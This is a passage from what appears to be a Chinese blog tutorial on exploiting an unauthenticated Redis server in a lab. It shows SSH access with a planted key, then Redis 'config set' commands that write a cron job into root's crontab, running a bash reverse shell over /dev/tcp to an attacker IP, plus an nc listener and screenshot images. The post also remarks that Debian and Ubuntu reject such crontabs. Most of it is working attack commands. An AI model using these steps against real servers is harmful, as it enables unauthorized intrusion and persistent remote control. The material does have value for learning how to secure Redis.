<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> id_rsa lynn@192.168.1.105</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="cat_key" src="/assets/images/10-4b6aaefd316291a0e4f759e6f6ea1666.png" width="659" height="196" class="img_ev3q"></p>
<p>可以看到不需要输入密码直接连接</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="写入计划任务corntab反弹shell">写入计划任务(corntab)反弹shell<a href="#写入计划任务corntab反弹shell" class="hash-link" aria-label="写入计划任务(corntab)反弹shell的直接链接" title="写入计划任务(corntab)反弹shell的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="注意️">注意⚠️<a href="#注意️" class="hash-link" aria-label="注意⚠️的直接链接" title="注意⚠️的直接链接">​</a></h4>
<p><strong>这里有一个很深的坑</strong>，那就是</p>
<p>crontab反弹debain,ubuntu都不行，因为他们对计划任务的格式很严格，必须要执行</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">crontab</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token plain"> root /var/spool/cron/crontabs/root</span><br></span></code></pre></div></div>
<p>通过语法检查后，才能执行计划任务。</p>
<p>因为这个坑，用了整整一天的时间来研究这个</p>
<p>参考文章</p>
<blockquote>
<p><a href="http://www.freebuf.com/vuls/148758.html" target="_blank" rel="noopener noreferrer">http://www.freebuf.com/vuls/148758.html</a></p>
</blockquote>
<p>主要是感谢下方的评论</p>
<hr>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="执行命令">执行命令<a href="#执行命令" class="hash-link" aria-label="执行命令的直接链接" title="执行命令的直接链接">​</a></h4>
<p>和写入公钥一样，将文件保存到本地，备份文件名必须要和用户的名字一样，比如是 lsa 那么备份文件就是 lsa</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token builtin class-name">set</span><span class="token plain"> shell </span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\n</span><span class="token string entity" style="color:#36acaa">\n</span><span class="token string" style="color:#e3116c">*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.1.100/1234 0&gt;&amp;1</span><span class="token string entity" style="color:#36acaa">\n</span><span class="token string entity" style="color:#36acaa">\n</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">config </span><span class="token builtin class-name">set</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">dir</span><span class="token plain"> /var/spool/cron/crontabs/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">config </span><span class="token builtin class-name">set</span><span class="token plain"> dbfilename root</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">save</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="攻击开启监听">攻击🐔开启监听<a href="#攻击开启监听" class="hash-link" aria-label="攻击🐔开启监听的直接链接" title="攻击🐔开启监听的直接链接">​</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-lvp</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1234</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="nc_1" src="data:image/png;base64,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" width="323" height="89" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="等待-1-分钟">等待 1 分钟<a href="#等待-1-分钟" class="hash-link" aria-label="等待 1 分钟的直接链接" title="等待 1 分钟的直接链接">​</a></h4>
<p>等待一分钟受害🐔即可执行任务，攻击🐔就可以收到shell</p>
<p><img decoding="async" loading="lazy" alt="nc_2" src="data:image/png;base64,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